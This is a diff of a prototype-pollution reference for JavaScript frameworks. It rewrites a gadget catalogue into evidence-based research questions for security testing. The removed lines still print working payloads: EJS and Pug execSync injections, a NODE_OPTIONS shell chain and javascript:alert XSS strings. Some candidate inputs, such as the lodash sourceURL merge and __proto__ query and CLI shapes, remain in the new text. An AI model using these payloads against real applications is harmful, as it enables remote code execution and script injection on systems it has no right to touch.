-    └── Go back to prototype-pollution-test.md for detection
+    └── Revisit baseline, competing explanations and observation; no automatic impact report
 ```
 
 ---
 
-## 7. QUICK REFERENCE — KEY PAYLOADS
+## 7. QUICK REFERENCE — CONSUMER QUESTIONS
 
-```json
-// EJS RCE
-{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');s"}}
+- What exact property was changed, and on which object/prototype?
+- Does the next consumer read an own property, inherited value or fixed default?
+- Which version/options/transform make that read reachable?
+- What action triggers it, under whose identity, and where is this result observed?
+- Does the control exclude ordinary data binding, cached output and another request?
 
-// Pug RCE
-{"__proto__":{"block":{"type":"Text","val":"x]);process.mainModule.require('child_process').execSync('id');//"}}}
-
-// child_process RCE (Node.js)
-{"__proto__":{"shell":"node","NODE_OPTIONS":"--require /proc/self/cmdline"}}
-
-// Lodash template XSS
-{"__proto__":{"sourceURL":"\u000ajavascript:alert(1)//"}}
-
-// Filter bypass (constructor path)
-{"constructor":{"prototype":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');s"}}}
-
-// Safe detection probe
-{"__proto__":{"pptest123":"polluted"}}
-```
+Use the relevant historical candidate only after these questions narrow the hypothesis; replacing `__proto__` with `constructor.prototype` without a parser/merge hypothesis is not new evidence.
 
 
 ---
@@ -528,84 +427,48 @@ Confirmed prototype pollution?
 
 ### EJS (Embedded JavaScript)
 
-| Polluted Property | Payload | Trigger | Impact | Versions |
+| Candidate Property | Mechanism to inspect | Required consumer | Possible effect | Applicability |
 |---|---|---|---|---|
-| `outputFunctionName` | `"x;process.mainModule.require('child_process').execSync('id');s"` | Any `res.render()` call | RCE | All versions with `opts` merge |
-| `destructuredLocals` | Array injection to control variable declarations | `res.render()` | RCE | EJS 3.x |
-| `escapeFunction` | Replace escape function with code | `res.render()` with HTML escaping | RCE | EJS 2.x–3.x |
-| `client` | `true` → changes compilation mode | `res.render()` | Code path change | All |
-
-```json
-{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('COMMAND');s"}}
-```
+| `outputFunctionName` | Option used in generated identifiers | Actual option propagation and compile path | Code generation only if constraints permit | v3.1.10 validates identifiers; see §1.2 |
+| `destructuredLocals` | Names used for local declarations | Actual option propagation and compile path | Declaration change only if constraints permit | v3.1.10 validates names; no blanket 3.x claim |
+| `escapeFunction` / `client` | Function/configuration consumed during compilation | Exact version, mode and inherited-property behavior | Determine from observed consumer | Historical candidates, not a version compatibility promise |
 
 ### Pug (formerly Jade)
 
-| Polluted Property | Payload | Trigger | Impact | Versions |
+| Candidate Property | Mechanism to inspect | Required consumer | Possible effect | Applicability |
 |---|---|---|---|---|
-| `block` | `{"type":"Text","val":"x]);process.mainModule.require('child_process').execSync('COMMAND');//"}` | `pug.compile()` / `pug.render()` | RCE | Pug 2.x–3.x |
-| `self` | `true` + `line` injection | Template compilation | RCE | Pug 2.x |
-| `debug` | `true` → outputs source code | Template compilation | Info disclosure | All |
-| `compileDebug` | `true` → includes debug info | Template compilation | Info disclosure | All |
+| `block`, `type`, `val` | AST traversal and text/code handling | Actual parser/transform/compiler reading inherited fields | Determine from emitted result | No blanket 2.x–3.x claim; see §1.3 |
+| `self`, `line`, `debug`, `compileDebug` | Option/debug metadata handling | Exact version, compile mode and output visibility | Error/context change is not automatically disclosure or execution | Historical candidates requiring source and runtime evidence |
 
-```json
-{"__proto__":{"block":{"type":"Text","val":"x]);process.mainModule.require('child_process').execSync('COMMAND');//"}}}
-```
+### Other historical template candidates
 
-### Jade (Legacy)
+These names retain research leads from the imported notes; their version ranges, API behavior and exploitability have not been revalidated. The old blanket version/impact table is removed. When an actual consumer is found, read that installed version's first-party documentation/source and check propagation before designing an experiment.
 
-| Polluted Property | Payload | Trigger | Impact | Versions |
-|---|---|---|---|---|
-| `self` | `true` | `jade.render()` | Code path change → RCE chain | Jade 1.x |
-| `debug` | `true` | Compilation | Source disclosure | All |
-
-### Mustache / Handlebars
-
-| Polluted Property | Payload | Trigger | Impact | Versions |
-|---|---|---|---|---|
-| `type` | `"Program"` with malicious body | `Handlebars.compile()` | RCE | Handlebars 4.x |
-| `allowProtoMethodsByDefault` | `true` | Any template render | Enables prototype method access | Handlebars 4.6+ |
-| `allowProtoPropertiesByDefault` | `true` | Any template render | Enables prototype property access | Handlebars 4.6+ |
-| `helpers` | Custom helper functions | Template with `{{helper}}` | RCE | All |
-
-```json
-{"__proto__":{"allowProtoMethodsByDefault":true,"allowProtoPropertiesByDefault":true}}
-```
-
-### Nunjucks
-
-| Polluted Property | Payload | Trigger | Impact | Versions |
-|---|---|---|---|---|
-| `type` | `"Code"` with value containing malicious code | `nunjucks.render()` | RCE | Nunjucks 3.x |
-| `autoesc` | `false` → disable auto-escaping | Template render | XSS escalation | All |
-
-### Twig.js
-
-| Polluted Property | Payload | Trigger | Impact | Versions |
-|---|---|---|---|---|
-| `allowInlineIncludes` | `true` | Template include | File inclusion | Twig.js 1.x |
-| `rethrow` | Custom function | Error handling | Code execution | Twig.js 1.x |
+| Historical context | Candidate names to locate in actual code | Question, not an exploitation claim |
+|---|---|---|
+| Jade | `self`, `debug` | Does this compilation path consume the inherited option, and is any resulting output visible? |
+| Handlebars | `type`, `program`, `helpers`, `allowProtoMethodsByDefault`, `allowProtoPropertiesByDefault` | Which compiler/runtime owns the property, and is the value data, AST or an actual callable? Do not infer the same behavior for Mustache. |
+| Nunjucks | `type`, `value`, `autoesc` | Is the property read by the reachable transform/compiler or ignored as ordinary data? |
+| Twig.js | `allowInlineIncludes`, `rethrow` | Does the exact version/options expose this path and an observable effect? |
 
 ---
 
 ## 2. LODASH
 
-| Polluted Property | Payload | Trigger | Impact | Versions |
-|---|---|---|---|---|
-| `sourceURL` | `"\u000ajavascript:alert(1)//"` | `_.template()` execution | XSS | Lodash < 4.17.21 |
-| `template` | Template string | `_.template()` | Code injection | All |
-| `imports._.templateSettings.interpolate` | Custom regex | `_.template()` | Code injection | All |
+| Historical candidate | Construction to inspect | Required consumer/evidence |
+|---|---|---|
+| `sourceURL` | `"\u000ajavascript:alert(1)//"` | Exact option propagation, validation and generated source; a source label or marker is not XSS |
+| `template` | Template string | Establish whether this property is read at all and whether it controls template source rather than data |
+| `imports._.templateSettings.interpolate` | Custom regex | Resolve the actual settings/import object and value type; ordinary delimiter configuration is not code injection |
 
-Vulnerable functions (merge sinks, NOT gadgets):
-- `_.merge(target, source)` — deep merge, writes to prototype
-- `_.defaultsDeep(target, source)` — same
-- `_.set(obj, path, value)` — if path is `__proto__.x`
-- `_.setWith(obj, path, value)` — same
+These imported candidates have no asserted compatible version range here. Candidate writing calls, distinct from the eventual consumer:
+- `_.merge(target, source)` / `_.defaultsDeep(target, source)` — inspect accepted keys, own/inherited lookup and target; a deep merge alone is not a prototype-write proof.
+- `_.set(obj, path, value)` / `_.setWith(obj, path, value)` — inspect actual path parsing/restrictions and the resolved write object.
 
 ```javascript
-// Pollution via merge:
+// Historical input + potential trigger, not a confirmation recipe:
 _.merge({}, JSON.parse('{"__proto__":{"sourceURL":"\\u000ajavascript:alert(1)//"}}'));
-// Trigger:
+// Only relevant if the above write and this inherited option read are established:
 _.template('hello')();
 ```
 
@@ -613,78 +476,71 @@ _.template('hello')();
 
 ## 3. JQUERY
 
-| Polluted Property | Payload | Trigger | Impact | Versions |
-|---|---|---|---|---|
-| `innerHTML` | `"<img src=x onerror=alert(1)>"` | DOM manipulation | XSS | jQuery 2.x–3.x |
-| `src` | `"javascript:alert(1)"` | Element creation | XSS | All |
-| `href` | `"javascript:alert(1)"` | Link creation | XSS | All |
-| `text` | Malicious string | `.text()` on empty elements | Content injection | All |
+| Historical candidate | Consumer to locate | Required evidence / counterexample |
+|---|---|---|
+| `innerHTML` | Application HTML/configuration path | Actual inherited read and unsafe interpretation; ordinary inert text output is different |
+| `src`, `href` | Specific element/URL integration | Exact property source, element, URL handling and trigger; creation alone proves no inherited read or execution |
+| `text` | Application text binding | Distinguish expected text display from a demonstrated cross-boundary effect; `.text()` is not itself an XSS conclusion |
 
-Vulnerable functions (merge sinks):
-- `$.extend(true, {}, userInput)` — deep merge with `true` first arg
-- `$.fn.extend()` — if called with attacker input
+Candidate writing calls are `$.extend(true, {}, userInput)` and application uses of `$.fn.extend()`. Trace their actual implementation and receiver; extending a particular library object is not automatically pollution of `Object.prototype`. The former blanket version/XSS mappings are not retained as compatibility claims.
 
 ---
 
 ## 4. ANGULAR.JS (1.x)
 
-| Polluted Property | Payload | Trigger | Impact | Versions |
-|---|---|---|---|---|
-| `__defineGetter__` | Overriding toString/valueOf | `$interpolate` / `$compile` | XSS | Angular 1.x |
-| `$parent` | Scope chain manipulation | Template expressions | Sandbox bypass | Angular 1.x < 1.6 |
-| `charset` | Modified charset | HTTP interceptors | Response manipulation | Angular 1.x |
+| Historical candidate | Path to inspect | Evidence still required |
+|---|---|---|
+| `__defineGetter__`, `toString`, `valueOf` | Actual interpolation/compilation read | Receiver, accepted value type and resulting operation; method names do not prove a callable injection |
+| `$parent` | Actual expression/scope traversal | Whether controlled state changes a permitted lookup or crosses a trust boundary |
+| `charset` | Application interceptor/configuration | Whether the property is consumed at all and what raw response changes |
 
-Angular sandbox escapes + PP: `{{constructor.constructor('alert(1)')()}}` may work if PP disables sandbox checks.
+The imported `{{constructor.constructor('alert(1)')()}}` expression is a historical candidate, not evidence that pollution disables a sandbox. Engine/version, expression context and the actual property-to-consumer path remain required; no affected version range is asserted here.
 
 ---
 
 ## 5. VUE.JS
 
-| Polluted Property | Payload | Trigger | Impact | Versions |
-|---|---|---|---|---|
-| `template` | `"<div v-html='\"<img src=x onerror=alert(1)>\"'></div>"` | Component creation without explicit template | XSS | Vue 2.x |
-| `render` | Custom render function | Component mount | Code execution | Vue 2.x |
-| `staticRenderFns` | Array of render functions | Component render | Code execution | Vue 2.x |
-| `compilerOptions` | Modified compilation options | Template compilation | Various | Vue 3.x |
+| Historical candidate | Path to inspect | Evidence still required |
+|---|---|---|
+| `template` | Actual component option resolution and compiler | Inherited source accepted in this build/mode; ordinary template features are not PP proof |
+| `render`, `staticRenderFns` | Actual rendering call and option construction | Supported value type and callable provenance; a JSON string/array does not itself supply functions |
+| `compilerOptions` | Actual compilation path | The specific option is read and changes a relevant operation, not merely stored |
+
+These names span historical integrations; establish the installed version/build and reachable consumer instead of assuming a Vue-wide chain.
 
 ---
 
 ## 6. WEBPACK
 
-| Polluted Property | Payload | Trigger | Impact | Versions |
-|---|---|---|---|---|
-| `output.library` | Modified library name | Build process | Code injection in output | Webpack 4.x–5.x |
-| `output.auxiliaryComment` | Code injection via comment | Build process | XSS in built files | Webpack 4.x |
-| `devtool` | `"eval"` → enables eval mode | Build process | Code execution path | Webpack 4.x–5.x |
+| Historical candidate | Consumer to inspect | Evidence still required |
+|---|---|---|
+| `output.library` | Actual configuration normalization and emitted wrapper | Inherited input survives validation and affects generated code, not just an allowed name |
+| `output.auxiliaryComment` | Actual comment generation/escaping | A boundary-breaking generated result; changing comment text alone is insufficient |
+| `devtool` | Actual build configuration | An unexpected cross-boundary capability; selecting a documented mode alone is not execution evidence |
 
-Webpack PP is exploitable during **build time**, not runtime. Useful in CI/CD attack chains.
+These are build-configuration candidates requiring a reachable build consumer and an attributable artifact. A runtime dependency fingerprint does not establish that path; inspect any later artifact consumption separately. No blanket version or impact mapping is asserted.
 
 ---
 
 ## 7. FASTIFY
 
-| Polluted Property | Payload | Trigger | Impact | Versions |
-|---|---|---|---|---|
-| `reply.view` options | Template engine options (same as EJS/Pug gadgets) | `reply.view()` | RCE | Fastify + point-of-view |
-| `rewriteUrl` | URL rewrite function | Request routing | Access control bypass | Fastify 3.x |
-| `schema` | Modified validation schema | Route validation | Validation bypass | Fastify 3.x–4.x |
+| Historical candidate | Consumer to inspect | Evidence still required |
+|---|---|---|
+| `reply.view` options | Actual template integration | Property propagation and observed effect; no assumed portability from EJS/Pug examples |
+| `rewriteUrl` | Actual routing hook/configuration | A reachable read, supported value type and a demonstrated unauthorized route result |
+| `schema` | Actual schema construction/validation | The inherited value changes enforcement for a controlled request; storage or a validation error is insufficient |
 
 ---
 
 ## 8. NODE.JS CORE
 
-| Polluted Property | Payload | Trigger | Impact | Versions |
-|---|---|---|---|---|
-| `shell` | `"node"` or `"/bin/sh"` | `child_process.spawn()` without explicit shell | RCE | All Node.js |
-| `NODE_OPTIONS` | `"--require /path/to/evil.js"` | `child_process.fork()` / `.spawn()` | RCE | Node.js 8+ |
-| `argv0` | Malicious argument | `child_process.spawn()` | Code injection | All |
-| `env` | Custom environment variables | `child_process.spawn()` without explicit env | ENV injection | All |
-| `input` | Stdin data | `child_process.execSync()` | Data injection | All |
-| `stdio` | Modified stdio config | `child_process.spawn()` | File descriptor manipulation | All |
+| Historical candidate | Required evidence before an experiment |
+|---|---|
+| `shell`, `argv0`, `execArgv` | Actual option construction, selected API, runtime/platform and a reachable call; no “All Node.js” compatibility claim |
+| `env`, `NODE_OPTIONS` | Distinguish top-level options from entries of the actual child environment; verify what survives normalization and what the selected child consumes |
+| `input`, `stdio` | Actual API supports and reads the option in this invocation; changing bytes/descriptors is not automatically execution |
 
-```json
-{"__proto__":{"shell":"node","NODE_OPTIONS":"--require /proc/self/cmdline"}}
-```
+See §1.1 for first-party sources and the current-source counterexample to universal prototype inheritance. Missing consumer/configuration evidence is a blocker.
 
 ---
 
@@ -693,39 +549,38 @@ Webpack PP is exploitable during **build time**, not runtime. Useful in CI/CD at
 ### minimist (Argument Parser)
 
 ```bash
-# CLI argument pollution:
+# Historical CLI input shape; only relevant if this input reaches the actual parser:
 node app.js --__proto__.polluted yes
-# Pollutes Object.prototype.polluted = "yes"
 ```
 
-Affected: minimist < 1.2.6
+Inspect the installed parser/version, option handling and resulting object/prototype. This spelling alone does not establish a write, and no affected version cutoff is asserted here.
 
 ### yargs
 
-Similar to minimist — CLI argument parsing can pollute prototype.
+Use the actual argument-parsing implementation as a candidate writing path; do not transfer minimist behavior or compatibility to it by analogy.
 
 ### qs (Query String Parser)
 
 ```
-# URL query pollution:
+# Historical query shapes, contingent on actual nesting/dot handling:
 ?__proto__[polluted]=yes
 ?__proto__.polluted=yes
 ```
 
-qs versions < 6.0.4 allow prototype pollution via nested brackets.
+Distinguish accepted query syntax, ordinary nested data and a subsequent prototype write. Determine options and version from the actual call; no blanket historical cutoff is used here.
 
 ### destr (JSON Parser)
 
 ```javascript
 destr('{"__proto__":{"polluted":"yes"}}')
-// Older versions allow PP through JSON parsing
+// Candidate input only: inspect own member, instance prototype and later consumers.
 ```
 
 ### json5
 
 ```javascript
 JSON5.parse('{"__proto__":{"polluted":"yes"}}')
-// Older versions may pollute prototype
+// Candidate input only: distinguish parsed data from an actual prototype change.
 ```
 
 ---
@@ -733,41 +588,35 @@ JSON5.parse('{"__proto__":{"polluted":"yes"}}')
 ## 10. GADGET SELECTION FLOWCHART
 
 ```
-Identified target stack?
+Confirmed property write and an actual consumer?
 │
 ├── Server-side Node.js
 │   ├── Express + template engine?
-│   │   ├── EJS → outputFunctionName (highest success rate)
-│   │   ├── Pug → block.type + block.val
-│   │   ├── Handlebars → allowProtoMethodsByDefault + template chain
-│   │   ├── Nunjucks → type: Code
-│   │   └── Unknown → try EJS gadget first (most common)
+│   │   ├── Known engine → confirm property read, version, configuration and trigger
+│   │   └── Unknown → locate consumer; do not default to EJS
 │   │
 │   ├── Fastify + point-of-view?
-│   │   └── Same template gadgets apply via reply.view
+│   │   └── Trace integration-specific locals/options; do not assume gadget portability
 │   │
-│   ├── child_process used? (likely yes in any Node.js app)
-│   │   └── shell + NODE_OPTIONS → universal Node.js RCE
+│   ├── Reachable child_process consumer?
+│   │   └── Inspect actual runtime/options/platform; no universal Node.js chain
 │   │
 │   └── No template / no child_process?
-│       └── Try status/header pollution for impact demonstration
+│       └── Locate another actual read or record consumer blocker; no assumed impact
 │
 ├── Client-side JavaScript
-│   ├── jQuery?
-│   │   └── $.extend(true,...) sink + innerHTML/src gadget
+│   ├── Reachable jQuery integration?
+│   │   └── Confirm writing path and separate DOM read; names alone are insufficient
 │   │
-│   ├── Lodash?
-│   │   └── _.merge/defaultsDeep sink + _.template sourceURL gadget
+│   ├── Reachable Lodash integration?
+│   │   └── Inspect actual merge/path handling and independent option consumer
 │   │
-│   ├── Angular 1.x?
-│   │   └── $interpolate + sandbox bypass
+│   ├── Reachable Angular/Vue component or compiler?
+│   │   └── Inspect exact property, value type, context and trigger
 │   │
-│   ├── Vue 2.x?
-│   │   └── template property pollution
-│   │
-│   └── None of the above?
-│       └── Generic DOM property pollution (src, href, innerHTML)
+│   └── No identified consumer?
+│       └── Retain the observed fact; do not infer a generic DOM gadget
 │
 └── Build pipeline (CI/CD)
-    └── Webpack output.library / devtool pollution
+    └── Actual configuration read → controlled build → inspect attributable artifact
 ```
